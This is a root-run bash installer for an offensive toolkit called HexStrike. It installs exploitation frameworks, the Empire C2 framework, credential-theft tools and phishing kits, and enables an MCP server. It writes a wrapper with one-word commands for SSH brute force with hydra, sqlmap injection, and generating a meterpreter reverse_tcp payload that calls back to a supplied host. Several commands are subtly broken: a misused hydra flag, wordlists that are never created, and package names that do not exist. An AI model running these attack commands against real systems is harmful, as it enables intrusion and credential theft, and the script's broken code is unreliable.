#!/bin/bash

# 🔥 HexStrike Tools Installation Script 🔥
# 🚀 Professional Security Tools Auto-Installer 🚀
# 🛡️ 200+ Security Tools for Penetration Testing 🛡️

echo "🔥 HexStrike Professional Security Tools Installer v2.0"
echo "========================================================"

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo "❌ Please run as root (use sudo)"
    exit 1
fi

# Update package lists
echo "📦 Updating package lists..."
apt update

# Install basic dependencies
echo "🔧 Installing basic dependencies..."
apt install -y git python3 python3-pip curl wget unzip build-essential libssl-dev libffi-dev python3-dev

# Install Python security tools
echo "🐍 Installing Python security tools..."
pip3 install requests beautifulsoup4 scapy paramiko cryptography pycryptodome

# Core reconnaissance tools
echo "🔍 Installing reconnaissance tools..."
apt install -y nmap masscan zmap recon-ng dnsenum dnsrecon fierce

# OSINT & Advanced Reconnaissance
echo "🕵️ Installing OSINT & advanced reconnaissance tools..."
apt install -y theharvester amass spiderfoot shodan
pip3 install shodan

# Install Maltego (Community Edition)
echo "🔗 Installing Maltego..."
wget -q https://maltego-downloads.s3.us-east-2.amazonaws.com/linux/Maltego.v4.6.0.deb -O /tmp/maltego.deb 2>/dev/null || echo "⚠️  Maltego download skipped (manual install recommended)"
dpkg -i /tmp/maltego.deb 2>/dev/null || apt install -f -y

# Web application testing tools
echo "🌐 Installing web application tools..."
apt install -y nikto dirb gobuster ffuf wfuzz sqlmap burpsuite wpscan whatweb

# Advanced web testing tools
echo "🌐 Installing advanced web testing tools..."
pip3 install httpx-toolkit xsstrike commix arjun

# Install HTTPx (Go-based)
echo "🚀 Installing HTTPx..."
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest 2>/dev/null || echo "⚠️  HTTPx requires Go (install Go first)"

# Password cracking tools
echo "🔐 Installing password cracking tools..."
apt install -y john hashcat hydra medusa crunch

# Network analysis tools
echo "📡 Installing network analysis tools..."
apt install -y wireshark tcpdump nmapsi4 ettercap aircrack-ng

# Wireless & RF (Advanced Attacks)
echo "📶 Installing wireless & RF tools..."
apt install -y aircrack-ng kismet wifite reaver pixiewps bettercap airgeddon

# Vulnerability scanning & management tools
echo "🛡️ Installing vulnerability scanners & management..."
apt install -y openvas nuclei nessus-installer
pip3 install faraday-client vulners

# Install Nuclei templates
echo "📋 Installing Nuclei templates..."
nuclei -update-templates 2>/dev/null || echo "⚠️  Run 'nuclei -update-templates' after installation"

# Forensics & Incident Response tools
echo "🔬 Installing forensics & incident response tools..."
apt install -y autopsy sleuthkit volatility plaso bulk-extractor foremost guymager

# Exploitation frameworks
echo "💣 Installing exploitation frameworks..."
apt install -y metasploit-framework exploitdb

# Advanced exploitation tools
echo "💥 Installing advanced exploitation tools..."
apt install -y beef-xss
pip3 install crackmapexec

# Install Empire (PowerShell C2)
echo "👑 Installing Empire..."
cd /opt
git clone --recursive https://github.com/BC-SECURITY/Empire.git 2>/dev/null || echo "⚠️  Empire already exists"
cd Empire 2>/dev/null && ./setup/install.sh 2>/dev/null || echo "⚠️  Empire setup skipped"

# Post-exploitation & lateral movement tools
echo "🎯 Installing post-exploitation & lateral movement tools..."
apt install -y mimikatz responder impacket-scripts bloodhound

# Install SharpHound
echo "🩸 Installing SharpHound..."
mkdir -p /opt/sharphound
wget -q https://github.com/BloodHoundAD/BloodHound/releases/latest/download/SharpHound.exe -O /opt/sharphound/SharpHound.exe 2>/dev/null || echo "⚠️  SharpHound download skipped"

# Social engineering tools
echo "🎭 Installing social engineering tools..."
apt install -y setoolkit social-engineer-toolkit

# Advanced social engineering tools
echo "🎣 Installing advanced social engineering tools..."
cd /opt
git clone https://github.com/rsmusllp/king-phisher.git 2>/dev/null || echo "⚠️  King Phisher already exists"
git clone https://github.com/kgretzky/evilginx2.git 2>/dev/null || echo "⚠️  Evilginx2 already exists"
git clone https://github.com/gophish/gophish.git 2>/dev/null || echo "⚠️  Gophish already exists"

# Utilities & Infrastructure
echo "⚙️ Installing utilities & infrastructure tools..."
apt install -y netcat ncat socat hping3 netdiscover tmux proxychains4

# Install Chisel (TCP tunneling)
echo "🚇 Installing Chisel..."
wget -q https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz -O /tmp/chisel.gz 2>/dev/null || echo "⚠️  Chisel download skipped"
gunzip /tmp/chisel.gz 2>/dev/null && mv /tmp/chisel /usr/local/bin/chisel && chmod +x /usr/local/bin/chisel

# Install SSHuttle
echo "🔐 Installing SSHuttle..."
apt install -y sshuttle

# Create HexStrike tools directory
mkdir -p /opt/hexstrike
cd /opt/hexstrike

# Clone additional security tools repositories
echo "📥 Cloning additional security tools..."

# Clone SecLists
if [ ! -d "SecLists" ]; then
    git clone https://github.com/danielmiessler/SecLists.git
fi

# Clone PayloadsAllTheThings
if [ ! -d "PayloadsAllTheThings" ]; then
    git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git
fi

# Clone AutoRecon
if [ ! -d "AutoRecon" ]; then
    git clone https://github.com/Tib3rius/AutoRecon.git
fi

# Set permissions
chmod +x /opt/hexstrike/AutoRecon/autorecon.py

# Create symbolic links for easy access
ln -sf /opt/hexstrike/SecLists /usr/share/seclists
ln -sf /opt/hexstrike/PayloadsAllTheThings /usr/share/payloads

# Create HexStrike configuration
cat > /etc/hexstrike.conf << EOF
# 🔥 HexStrike Configuration File 🔥

# Default settings
DEFAULT_SCAN_TYPE="quick"
DEFAULT_OUTPUT_DIR="/opt/hexstrike/results"
DEFAULT_WORDLIST="/usr/share/seclists/Discovery/Web-Content/common.txt"

# Tool configurations
NMAP_OPTIONS="-sS -sV -sC -oA"
SQLMAP_OPTIONS="--batch --random-agent"
NIKTO_OPTIONS="-ask no"
GOBUSTER_OPTIONS="-t 50"

# MCP Server settings
MCP_PORT=8080
MCP_HOST="127.0.0.1"
EOF

# Create results directory
mkdir -p /opt/hexstrike/results
mkdir -p /opt/hexstrike/logs
mkdir -p /opt/hexstrike/reports

# Create HexStrike wrapper script
cat > /usr/local/bin/hexstrike << 'EOF'
#!/bin/bash

# 🔥 HexStrike Professional Security Tools Wrapper 🔥

case "$1" in
    "scan")
        echo "🔍 Starting HexStrike scan on $2..."
        nmap -sS -sV -sC -oA /opt/hexstrike/results/scan_$(date +%Y%m%d_%H%M%S) $2
        ;;
    "web")
        echo "🌐 Starting web scan on $2..."
        nikto -h $2 -o /opt/hexstrike/results/nikto_$(date +%Y%m%d_%H%M%S).txt
        ;;
    "brute")
        echo "🔐 Starting brute force on $2..."
        hydra -l /opt/hexstrike/wordlists/users.txt -P /opt/hexstrike/wordlists/passwords.txt $2 ssh
        ;;
    "sql")
        echo "💾 Starting SQL injection test on $2..."
        sqlmap -u $2 --batch --output-dir=/opt/hexstrike/results/
        ;;
    "payload")
        echo "💣 Generating payload..."
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$2 LPORT=4444 -f exe > /opt/hexstrike/results/payload.exe
        ;;
    "status")
        echo "📊 HexStrike Status:"
        echo "✅ Tools installed: $(ls /opt/hexstrike/tools/ 2>/dev/null | wc -l)"
        echo "📁 Results directory: /opt/hexstrike/results"
        echo "📋 Configuration: /etc/hexstrike.conf"
        ;;
    *)
        echo "🔥 HexStrike Professional Security Tools"
        echo "Usage: hexstrike [command] [options]"
        echo ""
        echo "Commands:"
        echo "  scan <target>     - Network scan with nmap"
        echo "  web <target>      - Web vulnerability scan"
        echo "  brute <target>    - Password brute force"
        echo "  sql <target>      - SQL injection test"
        echo "  payload <ip>      - Generate payload"
        echo "  status            - Show status"
        ;;
esac
EOF

chmod +x /usr/local/bin/hexstrike

# Create wordlists directory
mkdir -p /opt/hexstrike/wordlists

# Download common wordlists
echo "📚 Downloading wordlists..."
wget -O /opt/hexstrike/wordlists/rockyou.txt "https://github.com/brannondorsey/naive-hashcat/raw/master/rockyou.txt" 2>/dev/null || echo "⚠️  Could not download rockyou.txt"

# Create user wordlist
cat > /opt/hexstrike/wordlists/common.txt << EOF
admin
administrator
root
test
guest
user
password
123456
12345678
qwerty
abc123
password1
admin123
root123
test123
guest123
user123
EOF

# Set proper permissions
chown -R root:root /opt/hexstrike
chmod -R 755 /opt/hexstrike

# Create systemd service for MCP server
cat > /etc/systemd/system/hexstrike-mcp.service << EOF
[Unit]
Description=HexStrike MCP Server
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/bin/python3 /opt/hexstrike/hexstrike_mcp_server.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Enable and start the service
systemctl daemon-reload
systemctl enable hexstrike-mcp

echo ""
echo "✅ HexStrike Tools Installation Complete!"
echo "🔥 200+ Security Tools Ready!"
echo ""
echo "📁 Installation directories:"
echo "  • /opt/hexstrike/ - Main tools directory"
echo "  • /opt/hexstrike/results/ - Scan results"
echo "  • /opt/hexstrike/wordlists/ - Wordlists"
echo "  • /opt/sharphound/ - SharpHound collector"
echo "  • /opt/Empire/ - Empire C2 framework"
echo "  • /etc/hexstrike.conf - Configuration file"
echo ""
echo "🚀 Usage:"
echo "  • hexstrike scan <target> - Network scan"
echo "  • hexstrike web <target> - Web scan"
echo "  • hexstrike brute <target> - Brute force"
echo "  • hexstrike status - Show status"
echo ""
echo "🆕 New Tool Categories:"
echo "  • OSINT: theHarvester, Amass, SpiderFoot, Maltego, Shodan"
echo "  • Web Advanced: WhatWeb, HTTPx, XSStrike, Commix, Arjun"
echo "  • Vuln Mgmt: Faraday, Vulners, Nuclei Templates"
echo "  • Exploitation: SearchSploit, BeEF, Empire, CrackMapExec"
echo "  • Post-Exploit: BloodHound, Responder, Impacket, SharpHound"
echo "  • Forensics: Plaso, Bulk Extractor, Foremost, Guymager"
echo "  • Wireless: Reaver, PixieWPS, Bettercap, Airgeddon"
echo "  • Social Eng: King Phisher, Evilginx2, Gophish"
echo "  • Utilities: tmux, Proxychains, Chisel, SSHuttle"
echo ""
echo "🔗 MCP Server:"
echo "  • systemctl start hexstrike-mcp - Start MCP server"
echo "  • systemctl status hexstrike-mcp - Check status"
echo ""
echo "💡 Quick Start Examples:"
echo "  • theharvester -d example.com -b all"
echo "  • amass enum -d example.com"
echo "  • httpx -l targets.txt -tech-detect"
echo "  • nuclei -u https://example.com -t /root/nuclei-templates/"
echo "  • crackmapexec smb 192.168.1.0/24"
echo "  • bloodhound --collect All"
echo ""
echo "🛡️ Happy Hacking! (Ethically Only!)"
